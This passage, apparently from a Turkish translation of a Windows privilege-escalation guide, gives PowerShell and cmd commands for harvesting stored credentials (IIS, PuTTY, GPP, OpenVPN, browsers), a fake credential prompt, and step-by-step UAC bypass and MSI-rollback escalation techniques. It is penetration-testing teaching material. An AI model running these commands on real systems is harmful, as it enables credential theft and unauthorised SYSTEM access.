if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
**Installer'lar SYSTEM yetkileriyle çalıştırılır**; birçoğu **DLL Sideloading** saldırılarına karşı savunmasızdır (**Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'deki SSH anahtarları

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` registry key'i içinde saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Bu tekniğin artık geçerli olmadığı görülüyor. Bazı ssh anahtarları oluşturmayı, bunları `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. `HKCU\Software\OpenSSH\Agent\Keys` registry anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya için arama yapın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebilirdi. İkinci olarak, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenen bu GPP'lerdeki parolaların şifresi, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu durum ciddi bir risk oluşturuyordu; çünkü kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak sağlayabilirdi.

Bu riski azaltmak amacıyla, yerel olarak önbelleğe alınmış ve boş olmayan bir `"cpassword"` alanı içeren GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev, parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki ayrıntıları içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyalar için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesinde)_ konumlarında arama yapın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Parolaları almak için crackmapexec kullanma:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi kimlik bilgilerini, hatta farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** istemenin gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir süre önce **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusundaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favourites bölümlerini de kontrol edin; bazı **parolalar** burada depolanıyor olabilir.

Tarayıcılardan parola çıkarmak için kullanılan araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişime** olanak tanıyan, Windows işletim sisteminin içinde bulunan bir teknolojidir. Her COM bileşeni bir class ID (CLSID) aracılığıyla **tanımlanır** ve her bileşen, interface ID'leri (IID'ler) aracılığıyla tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM class'ları ve interface'leri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında registry'de tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek **HKEY\CLASSES\ROOT** oluşturulur.

Bu registry'nin CLSID'leri içinde, bir **DLL**'yi gösteren **default value** ve **ThreadingModel** adlı bir value içeren **InProcServer32** child registry'sini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, bir DLL'yi gösteren default value ve bir value içeren InProcServer32 child registry'sini bulabilirsiniz...](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden** herhangi birinin üzerine yazabiliyorsanız ve bu DLL farklı bir kullanıcı tarafından çalıştırılacaksa **privilege escalation** gerçekleştirebilirsiniz.

Saldırganların persistence mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de genel parola araması**

**Dosya içeriklerinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla bir dosya ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parola arayan Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, victim içindeki credential'ları arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika tool'dur.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool'u, bu verileri clear text olarak kaydeden çeşitli tool'ların **session**'larını, **username**'lerini ve **parola**'larını arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in full access ile yeni bir process açtığını** (`OpenProcess()`) hayal edin. Aynı process'in, **ana process'in tüm açık handle'larını miras alan, ancak düşük ayrıcalıklara sahip yeni bir process oluşturduğunu** (`CreateProcess()`) düşünün.\
Ardından, **düşük ayrıcalıklı process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı process'e ait **açık handle'ı ele geçirip** bir **shellcode enjekte edebilirsiniz**.\
**Bu zafiyetin nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
Farklı izin seviyeleriyle miras alınan process ve thread'lerin daha fazla açık handle'ını (yalnızca full access değil) nasıl test edip kötüye kullanacağınızı daha kapsamlı şekilde açıklayan [**bu diğer yazıyı da okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşımlı memory segment'leri, process'ler arası iletişimi ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı network'ler üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, oluşturduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırının nasıl gerçekleştirileceğine ilişkin yararlı rehberlere [**buradan**](named-pipe-client-impersonation.md) ve [**buradan**](#from-high-integrity-to-system) ulaşabilirsiniz.

Ayrıca aşağıdaki tool, **burp gibi bir tool ile named pipe iletişimini intercept etmenizi** sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv), server mode'da `\\pipe\\tapsrv`'yi (MS-TRP) dışarıya açar. Remote authenticated bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya arbitrary **4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin haklarını elde edip service olarak arbitrary bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` writable mevcut bir path olarak ayarlanmış şekilde `ClientAttach` çağrılır → service, `CreateFileW(..., OPEN_EXISTING)` aracılığıyla bu dosyayı açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app register edilir, `TRequestMakeCall` (`Req_Func 121`) tetiklenir, `GetAsyncEvents` (`Req_Func 0`) ile alınır, ardından deterministic yazımları tekrarlamak için unregister/shutdown yapılır.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` bölümüne kendinizi ekleyin, reconnect yapın, ardından `GetUIDllName`'i arbitrary bir DLL path ile çağırarak `TSPI_providerUIIdentify`'ı `NETWORK SERVICE` olarak execute edin.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta stuff çalıştırabilecek File Extensions

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute abuse

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya register edilmiş herhangi bir scheme) tetikleyebilir ve attacker-controlled dosyaları mevcut user olarak execute edebilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Password'ler için Command Line'ları Monitoring Etme**

Bir user olarak shell elde ettiğinizde, **credential'ları command line üzerinde geçiren** scheduled task'ler veya diğer process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden parola çalma

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka herhangi bir işlemi çalıştırmak mümkündür.

Bu, aynı vulnerability ile aynı anda privilege escalation gerçekleştirmeyi ve UAC Bypass yapmayı mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium'dan High Integrity Level / UAC Bypass'e

Bunu **Integrity Levels** hakkında bilgi edinmek için okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'lerini öğrenmek için bunu okuyun:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik ve [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit kodu.

Saldırı, Windows Installer'ın rollback özelliğinin kötüye kullanılarak uninstall işlemi sırasında meşru dosyaların malicious dosyalarla değiştirilmesine dayanır. Bunun için saldırganın, diğer MSI paketlerinin uninstall işlemi sırasında rollback dosyalarını depolamak üzere Windows Installer tarafından kullanılacak `C:\Config.Msi` klasörünü ele geçirmek için kullanılacak **malicious bir MSI installer** oluşturması gerekir. Bu rollback dosyaları daha sonra malicious payload içerecek şekilde değiştirilir.

Özetlenen teknik şu şekildedir:

1. **Stage 1 – Hijack için hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Step 1: MSI'ı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece **non-admin user** bunu çalıştırabilir.
- Yükleme sonrasında dosyaya ait bir **handle**'ı açık tutun.

- Step 2: Uninstall işlemini başlatın
- Aynı `.msi` dosyasını uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve bunları `.rbf` dosyaları (rollback backups) olarak yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` haline geldiğinde bunu tespit etmek için açık dosya **handle**'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Step 3: Custom Syncing
- `.msi`, şu işlemleri yapan bir **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` dosyasının yazıldığını bildirir.
- Ardından uninstall işlemine devam etmeden önce başka bir event'i bekler.

- Step 4: `.rbf` dosyasının silinmesini engelleyin
- Bildirim geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın silinmesini engeller.
- Ardından uninstall işleminin tamamlanabilmesi için geri bildirim gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için `C:\Config.Msi` kaldırılmaz.

- Step 5: `.rbf` dosyasını manuel olarak silin
- Siz (attacker) `.rbf` dosyasını manuel olarak silin.
- Artık `C:\Config.Msi` boştur ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için SYSTEM-level arbitrary folder delete vulnerability'yi tetikleyin.

2. **Stage 2 – Rollback script'lerini malicious script'lerle değiştirme**

- Step 6: `C:\Config.Msi` klasörünü Weak ACL'lerle yeniden oluşturun
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Weak DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir **handle**'ı açık tutun.

- Step 7: Başka bir install çalıştırın
- `.msi` dosyasını şu ayarlarla tekrar install edin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir failure tetikleyen değişken.
- Bu install, `.rbs` ve `.rbf` dosyalarını tekrar okuyacak bir **rollback** tetiklemek için kullanılacaktır.

- Step 8: `.rbs` dosyasını izleyin
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü izlemek için `ReadDirectoryChangesW` kullanın.
- Dosya adını alın.

- Step 9: Rollback öncesinde Sync
- `.msi`, şu işlemleri yapan bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event bildirir.
- Ardından devam etmeden önce bekler.

- Step 10: Weak ACL'leri yeniden uygulayın
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **strong ACL'leri yeniden uygular**.
- Ancak hâlâ `WRITE_DAC` içeren bir handle'a sahip olduğunuz için **weak ACL'leri tekrar uygulayabilirsiniz**.

> ACL'ler **yalnızca handle open sırasında uygulanır**, dolayısıyla klasöre hâlâ yazabilirsiniz.

- Step 11: Fake `.rbs` ve `.rbf` dosyalarını bırakın
- `.rbs` dosyasının üzerine, Windows'a şunları söyleyen **fake bir rollback script** yazın:
- `.rbf` dosyanızı (malicious DLL) **privileged bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemek.
- **Malicious SYSTEM-level payload DLL** içeren fake `.rbf` dosyanızı bırakın.

- Step 12: Rollback'i tetikleyin
- Installer'ın devam etmesi için sync event'ini bildirin.
- Bir **type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **kasten failure'a uğratacak** şekilde yapılandırılmıştır.
- Bu, **rollback'in başlamasına** neden olur.

- Step 13: SYSTEM DLL'inizi install eder
- Windows Installer:
- Malicious `.rbs` dosyanızı okur.
- `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **malicious DLL'iniz SYSTEM-loaded bir path'tedir**.

- Final Step: SYSTEM code'u çalıştırın
